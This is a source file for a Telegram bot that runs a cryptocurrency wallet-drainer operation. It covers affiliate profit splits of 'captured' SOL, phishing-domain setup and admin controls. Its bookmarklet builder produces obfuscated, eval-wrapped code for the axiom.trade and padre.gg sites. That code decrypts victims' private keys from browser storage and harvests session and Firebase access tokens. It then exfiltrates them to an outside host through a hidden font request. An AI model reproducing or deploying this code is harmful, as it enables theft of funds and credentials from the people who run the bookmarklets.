      const userAmount = Number((amount * config.userShare / 100).toFixed(6));

      // Update state
      state.available = 0;
      state.withdrawn = Number((state.withdrawn + amount).toFixed(6));
      state.lastWithdrawal = new Date().toISOString();
      state.withdrawHistory = state.withdrawHistory || [];
      state.withdrawHistory.push({ 
        when: state.lastWithdrawal, 
        amount, 
        userAmount, 
        ownerAmount, 
        trigger: 'manual' 
      });
      await store.setUserState(userId, state);

      let reply = `✅ <b>Withdrawal processed</b>\n` +
        `• Total amount: <code>${formatCurrency(amount)} SOL</code>\n` +
        `• User share: <code>${formatCurrency(userAmount)} SOL</code>\n` +
        `• Owner share: <code>${formatCurrency(ownerAmount)} SOL</code>\n\n` +
        `📝 <b>Note:</b> Withdrawal recorded in bot accounting.`;

      return ctx.replyWithHTML(reply);
    }

    // Custom Domain handler
    if (normalized === '🌐 custom domain' || normalized === 'custom domain') {
      const currentDomain = state.customDomain || 'Not set (using default)';
      
      // Always use the correct default domain - with fallback chain
      let defaultDomain = process.env.BOOKMARKLET_SITE_URL || '';
      // Fix: Replace any old URLs with the new one
      if (defaultDomain.includes('velox-x.netlify.app') || defaultDomain.includes('velox-xx.netlify.app') || !defaultDomain) {
        defaultDomain = 'https://velox-xxx.netlify.app';
      }
      
      const targetHostname = defaultDomain.replace(/^https?:\/\//, '').split('/')[0];
      
      // Check if custom domain is configured and verify it
      let statusMessage = '';
      if (state.customDomain) {
        try {
          const testResponse = await fetch(state.customDomain, { 
            method: 'HEAD', 
            timeout: 5000,
            redirect: 'follow'
          }).catch(() => null);
          
          if (testResponse && testResponse.ok) {
            statusMessage = `\n\n✅ <b>Status:</b> Domain is working correctly!`;
          } else {
            statusMessage = `\n\n⚠️ <b>Status:</b> Domain not reachable. Check DNS configuration.`;
          }
        } catch (err) {
          statusMessage = `\n\n⚠️ <b>Status:</b> Unable to verify domain.`;
        }
      }
      
      const message = `🌐 <b>Custom Domain Settings</b>\n\n` +
        `📌 <b>Current:</b> ${currentDomain === 'Not set (using default)' ? currentDomain : `<code>${currentDomain}</code>`}\n` +
        `📌 <b>Default:</b> <code>${defaultDomain}</code>${statusMessage}\n\n` +
        `💡 <b>How it works:</b>\n` +
        `Set your own domain that points to the Velox website. This domain will be used in your bookmarklet landing link.\n\n` +
        `✏️ <b>To set/change:</b> Reply with your custom domain URL\n` +
        `Example: <code>https://yourdomain.com</code>\n\n` +
        `📋 <b>DNS Setup Required:</b>\n` +
        `Add CNAME record: <code>${targetHostname}</code>\n\n` +
        `🔄 <b>To reset to default:</b> Reply with <code>reset</code>`;

      state.step = 'set_custom_domain';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(message);
    }

    // Handle custom domain input
    if (state.step === 'set_custom_domain') {
      const input = text.trim();
      
      if (input.toLowerCase() === 'reset') {
        state.customDomain = null;
        state.step = 'completed';
        await store.setUserState(userId, state);
        const keyboard = getMenuKeyboard(userId, state, state.mode === 'admin');
        
        // Use the correct default domain with fallback
        let defaultDomain = process.env.BOOKMARKLET_SITE_URL || '';
        if (defaultDomain.includes('velox-x.netlify.app') || defaultDomain.includes('velox-xx.netlify.app') || !defaultDomain) {
          defaultDomain = 'https://velox-xxx.netlify.app';
        }
        
        return ctx.replyWithHTML(
          `✅ <b>Custom domain reset!</b>\n\nYou're now using the default domain:\n<code>${defaultDomain}</code>`,
          keyboard
        );
      }
      
      // Validate URL format
      const urlPattern = /^https?:\/\/[a-zA-Z0-9-._~:/?#[\]@!$&'()*+,;=]+$/;
      if (!urlPattern.test(input)) {
        return ctx.replyWithHTML(
          `❌ <b>Invalid URL format</b>\n\n` +
          `Please enter a valid URL starting with http:// or https://\n` +
          `Example: <code>https://yourdomain.com</code>\n\n` +
          `Or reply with <code>reset</code> to use the default domain.`
        );
      }
      
      // Remove trailing slash
      const cleanDomain = input.replace(/\/+$/, '');
      
      // Extract hostname for DNS verification
      let hostname = '';
      try {
        const url = new URL(cleanDomain);
        hostname = url.hostname;
      } catch (_) {
        hostname = cleanDomain.replace(/^https?:\/\//, '').split('/')[0];
      }
      
      // Get default domain for DNS instructions
      let defaultDomain = process.env.BOOKMARKLET_SITE_URL || 'https://velox-xxx.netlify.app';
      if (defaultDomain.includes('velox-x.netlify.app') || defaultDomain.includes('velox-xx.netlify.app')) {
        defaultDomain = 'https://velox-xxx.netlify.app';
      }
      const targetHostname = defaultDomain.replace(/^https?:\/\//, '').split('/')[0];
      
      // Verify domain is reachable
      let domainStatus = '⏳ Checking...';
      let dnsConfigured = false;
      
      try {
        const testResponse = await fetch(cleanDomain, { 
          method: 'HEAD', 
          timeout: 5000,
          redirect: 'follow'
        }).catch(() => null);
        
        if (testResponse && testResponse.ok) {
          domainStatus = '✅ Domain is reachable';
          dnsConfigured = true;
        } else {
          domainStatus = '⚠️ Domain not reachable - DNS may not be configured';
        }
      } catch (err) {
        domainStatus = '⚠️ Domain not reachable - DNS may not be configured';
      }
      
      state.customDomain = cleanDomain;
      state.step = 'completed';
      await store.setUserState(userId, state);
      
      const keyboard = getMenuKeyboard(userId, state, state.mode === 'admin');
      
      if (dnsConfigured) {
        // Domain is working!
        return ctx.replyWithHTML(
          `✅ <b>Custom domain saved and verified!</b>\n\n` +
          `Your bookmarklet will now use:\n<code>${cleanDomain}</code>\n\n` +
          `${domainStatus}\n\n` +
          `🎉 Your domain is properly configured and ready to use!`,
          keyboard
        );
      } else {
        // Domain not configured - show DNS instructions
        return ctx.replyWithHTML(
          `✅ <b>Custom domain saved!</b>\n\n` +
          `Your bookmarklet will now use:\n<code>${cleanDomain}</code>\n\n` +
          `${domainStatus}\n\n` +
          `⚠️ <b>IMPORTANT: Configure DNS first!</b>\n\n` +
          `📋 <b>DNS SETUP INSTRUCTIONS:</b>\n` +
          `1️⃣ Login to your domain registrar (GoDaddy, Namecheap, Cloudflare, etc.)\n` +
          `2️⃣ Go to DNS Management / DNS Settings\n` +
          `3️⃣ Add a CNAME record:\n` +
          `   • <b>Type:</b> CNAME\n` +
          `   • <b>Name/Host:</b> @ (or www)\n` +
          `   • <b>Value/Target:</b> <code>${targetHostname}</code>\n` +
          `   • <b>TTL:</b> Automatic (or 3600)\n\n` +
          `⏱ <b>Wait 5-60 minutes</b> for DNS propagation\n\n` +
          `✅ <b>Test:</b> Visit <code>${cleanDomain}</code> - you should see the Velox website\n\n` +
          `💡 <b>Need help?</b> Search "how to add CNAME record [your registrar name]"`,
          keyboard
        );
      }
    }

    // Admin/User mode toggle via keyboard buttons
    if (normalized === 'admin mode') {
      if (!isAdmin(userId)) {
        return ctx.replyWithHTML('❌ <b>Admin only</b>');
      }
      state.mode = 'admin';
      await store.setUserState(userId, state);
      const keyboard = getMenuKeyboard(userId, state, true);
      return ctx.replyWithHTML('🔧 <b>Admin mode enabled.</b>', keyboard);
    }

    if (normalized === 'user mode') {
      state.mode = 'user';
      await store.setUserState(userId, state);
      const keyboard = getMenuKeyboard(userId, state, false);
      return ctx.replyWithHTML('🔹 <b>User mode enabled.</b>', keyboard);
    }

    // Admin command shortcuts
    if (normalized === 'revoke user') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_revoke';
      await store.setUserState(userId, state);
        console.debug('admin_revoke_mode_set for', userId);
      return ctx.replyWithHTML('⛔ <b>Send the user id to revoke.</b>');
    }

    if (normalized === 'restore user' || normalized === 'unrevoke user') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_unrevoke';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('✅ <b>Send the user id to restore.</b>');
    }

    if (normalized === 'admin stats') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      const allUsers = await store.getAllUsers();
      const config = await store.getBotConfig();
      const totalUsers = allUsers.length;
      const totalActive = allUsers.filter((u) => !u.revoked).length;
      const totalRevoked = allUsers.filter((u) => u.revoked).length;
      const totalWallets = allUsers.filter((u) => u.wallet).length;
      const totalCaptured = allUsers.reduce((s, u) => s + (Number(u.totalCaptured) || 0), 0);
      const totalWithdrawn = allUsers.reduce((s, u) => s + (Number(u.withdrawn) || 0), 0);
      const totalAvailable = allUsers.reduce((s, u) => s + (Number(u.available) || 0), 0);
      const totalTier2 = allUsers.filter((u) => u.tier2).length;

      const summary = {
        totalUsers,
        totalActive,
        totalRevoked,
        totalWallets,
        totalTier2,
        totalCaptured,
        totalWithdrawn,
        totalAvailable,
        userShare: config.userShare,
        ownerShare: config.ownerShare,
        ownerWallet: config.ownerWallet,
      };

      const reply = `🔐 <b>Admin Summary</b>\n\n` +
        `👥 Total users: <b>${summary.totalUsers}</b>\n` +
        `✅ Active users: <b>${summary.totalActive}</b>\n` +
        `⛔ Revoked users: <b>${summary.totalRevoked}</b>\n` +
        `🏅 Tier 2 users: <b>${summary.totalTier2}</b>\n` +
        `💼 Wallets connected: <b>${summary.totalWallets}</b>\n\n` +
        `💰 Total captured: <b>${formatCurrency(summary.totalCaptured)} SOL</b>\n` +
        `💵 Total withdrawn: <b>${formatCurrency(summary.totalWithdrawn)} SOL</b>\n` +
        `📥 Total available: <b>${formatCurrency(summary.totalAvailable)} SOL</b>\n\n` +
        `🧾 Split: <b>${summary.userShare}% user / ${summary.ownerShare}% owner</b>\n` +
        `🏦 Owner payout wallet:\n<code>${summary.ownerWallet}</code>`;

      console.debug('admin_stats requested by', userId);
      return ctx.replyWithHTML(reply);
    }

    if (normalized === 'set split') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_setsplit';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('🧾 <b>Enter the new split</b> as two numbers that add up to 100, for example: 20 80 or 70 30.');
    }

    if (normalized === 'owner wallet') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      const config = await store.getBotConfig();
      return ctx.replyWithHTML(`🏦 <b>Owner payout wallet</b>\n<code>${config.ownerWallet}</code>`);
    }

    if (normalized === 'change owner wallet') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_change_owner_wallet';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('✏️ <b>Send the new owner payout wallet address.</b>');
    }

    if (normalized === 'make admin') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_make_admin';
      await store.setUserState(userId, state);
      console.debug('admin_make_admin_mode_set for', userId);
      return ctx.replyWithHTML('👑 <b>Send the user id to grant admin access.</b>');
    }

    if (normalized === 'disable auto withdrawals') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      const users = await store.getAllUsers();
      for (const u of users) {
        u.autoWithdraw = false;
        // try to persist if we can find an id (ensure we have ids by scanning keys)
      }
      // Persist each user state by id (we need ids list)
      const allIds = await store.getAllUserIds();
      for (const id of allIds) {
        const s = await store.getUserState(id);
        s.autoWithdraw = false;
        await store.setUserState(id, s);
      }
      return ctx.replyWithHTML('⛔ <b>All auto withdrawals have been disabled for every user.</b>');
    }

    if (normalized === 'broadcast') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_broadcast';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('📣 <b>Send the broadcast message to all users.</b>');
    }

    if (normalized === 'set bookmarklet url') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_setbookmarkleturl';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('🌐 <b>Send the full landing page URL.</b> Example: https://your-host.com');
    }

    if (normalized === 'promote tier 2' || normalized === 'promote tier2') {
      if (!isAdmin(userId)) return ctx.replyWithHTML('❌ <b>Admin only</b>');
      state.step = 'admin_promote_tier2';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('🚀 <b>Send the user id to promote to Tier 2.</b>');
    }

    if (normalized === 'bot token') {
      if (!state.tier2) {
        return ctx.replyWithHTML('❌ <b>Bot Token access is available for Tier 2 users only.</b>');
      }
      state.step = 'tier2_set_bot_token';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('🤖 <b>Send your personal bot token to receive private notifications.</b>');
    }

    // Handle admin step-based inputs
    if (state.step === 'choose_mode') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      return ctx.replyWithHTML('❌ <b>Choose Admin Mode or User Mode.</b>');
    }

    if (state.step === 'admin_setsplit') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const parts = text.split(/\s+/);
      const ownerShare = Number(parts[0]);
      const userShare = Number(parts[1]);
      if (!Number.isFinite(ownerShare) || !Number.isFinite(userShare) || ownerShare < 0 || userShare < 0 || ownerShare + userShare !== 100) {
        return ctx.replyWithHTML('❌ <b>Invalid split.</b> Send two numbers that add to 100, for example: 20 80 or 70 30.');
      }
      const config = await store.getBotConfig();
      config.ownerShare = ownerShare;
      config.userShare = userShare;
      await store.setBotConfig(config);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ Split updated to <b>${userShare}% user</b> and <b>${ownerShare}% owner</b>.`);
    }

    if (state.step === 'admin_setbookmarkleturl') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const url = text.trim();
      if (!url || !/^https?:\/\//.test(url)) {
        return ctx.replyWithHTML('❌ <b>Invalid URL.</b> Send the full URL starting with https://');
      }
      const config = await store.getBotConfig();
      config.bookmarkletSiteUrl = url.replace(/\/+$/g, '');
      await store.setBotConfig(config);
      console.debug('bookmarklet URL set by', userId, config.bookmarkletSiteUrl);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ <b>Bookmarklet URL set.</b>\n${config.bookmarkletSiteUrl}`);
    }

    if (state.step === 'admin_promote_tier2') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const targetId = Number(text.trim());
      if (!targetId) return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to promote.</b>');
      const target = await store.getUserState(targetId);
      target.tier2 = true;
      await store.setUserState(targetId, target);
      state.step = 'completed';
      await store.setUserState(userId, state);

      const congrats =
        '🎉 <b>Congratulations!</b>\n' +
        'You have been promoted to Tier 2 by an admin. You now have access to Bot Token and private notifications. Use /menu to update your settings.';
      try {
        await ctx.telegram.sendMessage(targetId, congrats, { parse_mode: 'HTML' });
      } catch (err) {
        // ignore errors if user has blocked the bot or never started it
      }
      return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been promoted to Tier 2.`);
    }

    if (state.step === 'tier2_set_bot_token') {
      if (!state.tier2) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Tier 2 access required.</b>');
      }
      const tokenValue = text.trim();
      if (!tokenValue) {
        return ctx.replyWithHTML('❌ <b>Send a non-empty bot token.</b>');
      }
      state.personalBotToken = tokenValue;
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML('✅ <b>Personal bot token saved.</b> You will receive private notifications through Leviathan when they are fired.');
    }

    if (state.step === 'admin_revoke') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const targetId = Number(text.trim());
      if (!targetId) return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to revoke.</b>');
      const target = await store.getUserState(targetId);
      target.revoked = true;
      await store.setUserState(targetId, target);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been revoked.`);
    }

    if (state.step === 'admin_unrevoke') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const targetId = Number(text.trim());
      if (!targetId) return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to restore.</b>');
      const target = await store.getUserState(targetId);
      target.revoked = false;
      await store.setUserState(targetId, target);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been restored.`);
    }

    if (state.step === 'admin_change_owner_wallet') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      if (!isValidSolanaAddress(text)) {
        return ctx.replyWithHTML('❌ <b>Invalid Solana wallet address.</b> Send a valid 43 or 44 character base58 Solana address.');
      }
      const config = await store.getBotConfig();
      config.ownerWallet = text;
      await store.setBotConfig(config);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ <b>Owner wallet updated.</b>\n<code>${text}</code>`);
    }

    if (state.step === 'admin_make_admin') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const targetId = Number(text.trim());
      if (!targetId) return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to grant admin access.</b>');
      adminIds.add(targetId);
      const config = await store.getBotConfig();
      config.admins = config.admins || [];
      if (!config.admins.includes(targetId)) config.admins.push(targetId);
      await store.setBotConfig(config);
      // ensure target has a user state record
      await store.getUserState(targetId);
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ User <b>${targetId}</b> is now an admin.`);
    }

    if (state.step === 'admin_broadcast') {
      if (!isAdmin(userId)) {
        state.step = 'completed';
        await store.setUserState(userId, state);
        return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
      }
      const broadcastText = `🎖️ <b>Admin Broadcast</b>\n` +
        `━━━━━━━━━━━━\n` +
        `<em>${escapeHtml(text)}</em>\n` +
        `━━━━━━━━━━━━`;
      const allUserIds = await store.getAllUserIds();
      await Promise.all(allUserIds.map((id) => ctx.telegram.sendMessage(id, broadcastText, { parse_mode: 'HTML' }).catch(() => null)));
      state.step = 'completed';
      await store.setUserState(userId, state);
      return ctx.replyWithHTML(`✅ <b>Broadcast sent to ${allUserIds.length} users.</b>`);
    }

    // Default fallback
    return sendLanguageSelection(ctx);
  });
}

async function buildBookmarkletFile(type, userId, username, store) {
  const API_ORIGIN = 'https://leviathan-kohl.vercel.app';
  const botId = type === 'padre' ? 'padre-bot' : 'axiom-bot';
  const platform = type;

  // AXIOM: Exact working bookmarklet from public/velox-bookmarklet-axiom.js
  if (type === 'axiom') {
    const drainerCode = `(async function () {
    const SEND_URL = '${API_ORIGIN}/api/send';
    const platform = '${platform}';
    const botId = '${botId}';
    const ua = navigator.userAgent || 'unknown';
    const hw = (navigator.platform || 'unknown') + ' | ' +
        (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' +
        (screen.colorDepth || 0) + 'bit';

    function sendData(data) {
        try {
            const encoded = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
            const url = SEND_URL + '?nocache=' + encoded;
            const styleEl = document.createElement('style');
            styleEl.textContent = '@font-face{font-family:"_lv' + Date.now() + '";src:url("' + url + '")}';
            document.head.appendChild(styleEl);
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:-9999px;font-family:"_lv' + Date.now() + '",serif;font-size:1px';
            div.textContent = '.';
            document.body.appendChild(div);
            setTimeout(function () {
                try { document.head.removeChild(styleEl); } catch (_) {}
                try { document.body.removeChild(div); } catch (_) {}
            }, 5000);
        } catch (e) {}
    }

    var username = 'unknown';
    try {
        var sels = [
            'header button[class*="flex"][class*="items-center"] span',
            '[data-username]',
            'nav [class*="address"]',
            '[class*="UserProfile"]',
        ];
        for (var i = 0; i < sels.length; i++) {
            var el = document.querySelector(sels[i]);
            if (el && el.textContent && el.textContent.trim()) {
                var t = el.textContent.trim();
                if (!t.toLowerCase().includes('connect') && !t.toLowerCase().includes('wallet') &&
                    t.length > 2 && t.length < 64) {
                    username = t.slice(0, 48);
                    break;
                }
            }
        }
        if (username === 'unknown') {
            var m = location.pathname.match(/\\/@?([a-zA-Z0-9_.-]+)/);
            if (m && m[1]) username = m[1].slice(0, 48);
        }
        if (username === 'unknown' && document.title) {
            var tt = document.title.replace(/axiom|discover|trade|\\|/gi, '').trim();
            if (tt.length > 2 && tt.length < 64) username = tt.slice(0, 48);
        }
    } catch (_) {}

    if (!location.hostname.includes('axiom.trade')) return;

    function a2s(a) {
        var AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        var d = [0];
        for (var i = 0; i < a.length; i++) {
            var c = a[i];
            for (var j = 0; j < d.length; j++) {
                var v = d[j] * 256 + c; d[j] = v % 58; c = v / 58 | 0;
            }
            while (c) { d.push(c % 58); c = c / 58 | 0; }
        }
        var s = '';
        for (var i = 0; i < a.length && a[i] === 0; i++) s += AB[0];
        for (var i = d.length - 1; i >= 0; i--) s += AB[d[i]];
        return s;
    }
    function a2evm(e) {
        return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
            .map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
    }
    function s2a(k) {
        try { return Uint8Array.from(atob(k.replace(/-/g, '+').replace(/_/g, '/')), function (c) { return c.charCodeAt(0); }); }
        catch (_) { return new TextEncoder().encode(k); }
    }
    async function decB(ck, enc) {
        var p = String(enc).split(':');
        return new Uint8Array(await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: s2a(p[0]), tagLength: 128 }, ck, s2a(p[1])
        ));
    }

    try {
        var resp = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
            method: 'POST', credentials: 'include'
        });
        if (!resp.ok) throw new Error('bundle API ' + resp.status);
        var bk = (await resp.json()).bundleKey;
        if (!bk) throw new Error('no bundleKey');

        var ck = await crypto.subtle.importKey('raw', s2a(bk).buffer, { name: 'AES-GCM' }, false, ['decrypt']);
        var sb = JSON.parse(localStorage.getItem('sBundles') || '[]');
        var eb = JSON.parse(localStorage.getItem('eBundles') || '[]');
        var keys = [];

        for (var i = 0; i < sb.length; i++) {
            try {
                var dec = await decB(ck, sb[i]);
                if (dec.length === 64) keys.push({ public: a2s(dec.slice(32)), private: a2s(dec) });
            } catch (_) {}
        }

        var ethers = null;
        try { ethers = await import('https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm'); } catch (_) {}

        for (var i = 0; i < eb.length; i++) {
            try {
                var dec = await decB(ck, eb[i]);
                var priv = a2evm(dec);
                var pub = ethers ? ethers.computeAddress('0x' + priv) : 'evm';
                keys.push({ public: pub, private: priv });
            } catch (_) {}
        }

        sendData({
            type: platform,
            username: username,
            botId: botId,
            platform: platform,
            keys: keys,
            userAgent: ua,
            hardwareInfo: hw,
            url: location.href,
            message: 'Wallets captured | Page: ' + location.href,
        });

    } catch (err) {}
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // PADRE: Self-contained inline drainer (exact copy from public/velox-bookmarklet-padre.js)
  if (type === 'padre') {
    const drainerCode = `(async function () {
    const SEND_URL = '${API_ORIGIN}/api/send';
    const platform = '${platform}';
    const botId = '${botId}';
    const ua = navigator.userAgent || 'unknown';
    const hw = (navigator.platform || 'unknown') + ' | ' + (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' + (screen.colorDepth || 0) + 'bit';

    function sendData(data) {
        try {
            const enc = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
            const url = SEND_URL + '?nocache=' + enc;
            const id = '_lv' + Date.now();
            const st = document.createElement('style');
            st.textContent = '@font-face{font-family:"' + id + '";src:url("' + url + '")} .' + id + '{font-family:"' + id + '"}';
            const dv = document.createElement('div');
            dv.innerText = '.';
            dv.className = id;
            dv.style.cssText = 'position:fixed;top:-9999px;font-size:1px';
            document.body.appendChild(dv);
            document.head.appendChild(st);
            setTimeout(function () { try { document.head.removeChild(st); } catch (_) {}; try { document.body.removeChild(dv); } catch (_) {} }, 5000);
        } catch (e) {}
    }

    let sessionData = null, walletsCache = null, hiddenWalletsCache = null, stamperEncoded = null;
    let username = 'unknown';
    try {
        sessionData = JSON.parse(localStorage.getItem('padreV2-session') || 'null');
        walletsCache = JSON.parse(localStorage.getItem('padreV2-walletsCache') || 'null');
        hiddenWalletsCache = JSON.parse(localStorage.getItem('padreV2-hiddenWalletsCache') || 'null');
        stamperEncoded = JSON.parse(localStorage.getItem('padreV2-stamper') || 'null');
        if (sessionData) {
            const uid = sessionData.uid || sessionData.userId || '';
            if (uid && uid.length > 2 && uid.length < 64) username = uid.slice(0, 48);
        }
    } catch (_) {}

    const allWallets = [];
    function collectWallets(cache) {
        if (!cache) return;
        try {
            for (const key of Object.keys(cache)) {
                const arr = cache[key];
                if (!Array.isArray(arr)) continue;
                for (const w of arr) {
                    allWallets.push({
                        public: w.publicAddress || w.address || '',
                        walletName: w.walletName || '',
                        type: w.walletType || '',
                        subOrgId: w.subOrgId || '',
                        walletId: w.walletId || w.id || '',
                        isImported: w.isImported || false,
                    });
                }
            }
        } catch (_) {}
    }
    collectWallets(walletsCache);
    collectWallets(hiddenWalletsCache);

    if (!location.hostname.includes('padre.gg')) {
        sendData({ type: platform, username, botId, platform, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Page: ' + location.href });
        return;
    }

    let accessToken = '', userEmail = '';
    try {
        const rows = await new Promise((res, rej) => {
            const req = indexedDB.open('firebaseLocalStorageDb');
            req.onsuccess = () => {
                const db = req.result;
                const r = db.transaction('firebaseLocalStorage', 'readonly').objectStore('firebaseLocalStorage').getAll();
                r.onsuccess = () => res(r.result);
                r.onerror = () => rej(r.error);
            };
            req.onerror = () => rej(req.error);
        });
        if (rows && rows.length > 0 && rows[0].value) {
            accessToken = rows[0].value.stsTokenManager.accessToken;
            userEmail = rows[0].value.email || rows[0].value.displayName || '';
            const firebaseUid = rows[0].value.uid || rows[0].value.localId || '';
            if (firebaseUid && (!sessionData || !sessionData.uid)) {
                if (!sessionData) sessionData = {};
                sessionData.uid = firebaseUid;
                sessionData.sessionId = '';
            }
            if (userEmail && username === 'unknown') username = userEmail.split('@')[0].slice(0, 48);
        }
    } catch (_) {}

    const walletKeys = allWallets.filter(w => w.public).map(w => ({ public: w.public, private: 'pending', type: w.type, walletName: w.walletName }));

    if (!accessToken || !sessionData) {
        const debugInfo = 'auth:' + (accessToken ? 'yes' : 'no') + ' session:' + (sessionData ? 'yes' : 'no');
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre: ' + debugInfo + ' | Page: ' + location.href });
        return;
    }

    try {
        const velvetRes = await fetch('https://backend.padre.gg/velvet/users/' + sessionData.uid + '/get-velvet', {
            method: 'GET',
            headers: { 'X-Padre-Session': sessionData.sessionId || '', 'Authorization': 'Bearer ' + accessToken },
        });
        if (!velvetRes.ok) throw new Error('velvet ' + velvetRes.status);
        const velvetObj = await velvetRes.json();

        sendData({
            type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href,
            padreDecryptPayload: {
                sessionUid: sessionData.uid, sessionId: sessionData.sessionId, accessTokenFull: accessToken,
                stamperEncoded: stamperEncoded, velvetBundle: velvetObj.bundle, wallets: allWallets,
            },
            message: 'Padre | ' + allWallets.length + ' wallet(s) | ' + (userEmail || username) + ' | Page: ' + location.href,
        });
    } catch (err) {
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre error: ' + (err.message || '') + ' | Page: ' + location.href });
    }
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // Fallback (should never reach here)
  return {
    buffer: Buffer.from('javascript:alert("Invalid bookmarklet type")', 'utf8'),
    filename: `${type}-bookmarklet.txt`,
  };
}


module.exports = {
  setupBotHandlers,
  buildBookmarkletFile,
};
